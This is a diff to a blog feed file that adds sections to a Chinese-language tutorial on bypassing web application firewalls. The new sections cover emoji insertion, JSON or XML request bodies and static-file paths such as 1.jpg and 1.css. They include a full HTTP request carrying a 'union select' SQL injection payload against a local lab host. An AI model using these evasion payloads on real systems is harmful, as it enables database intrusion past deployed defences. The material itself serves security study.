@@ -5244,6 +5244,11 @@
 </table>
 </div>
 <h3 id="Emoji表情字符绕过"><a href="#Emoji表情字符绕过" class="headerlink" title="Emoji表情字符绕过"></a>Emoji表情字符绕过</h3><p>emoji是一串unicode字集组成，一个emoji图标可以占2、4、7个字节。且mysql支持emoji存储。</p>
+<p>部分Emoji可以插入到%23与%0A之间实现绕过。</p>
+<h3 id="json提交与xml提交绕过"><a href="#json提交与xml提交绕过" class="headerlink" title="json提交与xml提交绕过"></a>json提交与xml提交绕过</h3><p>有些程序是 json 提交参数，程序也是 json 接收再拼接到 SQL 执行 json 格式通 常不会被拦截。所以可以绕过 waf。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /06/vul/sqli/sqli_id.php HTTP/1.1</span><br><span class="line">Host: 192.168.0.115</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type:application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">Origin: http://192.168.0.115</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.0.115/06/vul/sqli/sqli_id.php</span><br><span class="line">Cookie: PHPSESSID=e6sa76lft65q3fd25bilbc49v3; security_level=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&#x27;id&#x27;:1 union select 1,2,3,&#x27;submit&#x27;:1&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/01/PocMO7Ex5aUe231.png" alt="image-20211101231132608"></p>
+<p>同样 text/xml 也不会被拦截</p>
 <h3 id="特殊的百分号"><a href="#特殊的百分号" class="headerlink" title="特殊的百分号"></a><strong>特殊的百分号</strong></h3><p>在<strong>ASP/ASPX+IIS</strong>的环境中存在一个特性，就是特殊符号%，在该环境下当们我输入s%elect的时候，在WAF层可能解析出来的结果就是s%elect，但是在iis+asp的环境的时候，解析出来的结果为select。</p>
 <h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p>
 <p>在ASPX中，有一个比较特殊的HPP特性，当GET/POST/COOKIE同时提交的参数id，服务端接收参数id的顺序GET,POST,COOKIE，中间通过逗号链接，于是就有了这个idea。</p>
@@ -5267,6 +5272,9 @@
 <p>白名单通常有目录：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin</span><br><span class="line"></span><br><span class="line">/phpmyadmin</span><br><span class="line"></span><br><span class="line">/admin.php</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/11/01/T1uIml34HhcYdCe.png" alt="image-20211101220538726"></p>
+<h3 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h3><p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。 例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会 进行检测从而绕过 waf 拦截。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>jpg<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="number">1.</span>css<span class="operator">=</span><span class="operator">/</span><span class="number">1.</span>css<span class="operator">&amp;</span>name<span class="operator">=</span>vince<span class="operator">+</span><span class="operator">&amp;</span>submit<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/01/j6q3iExLdB59h2S.png" alt="image-20211101230701225"></p>
 ]]></content>
       <categories>
         <category>Web安全</category>
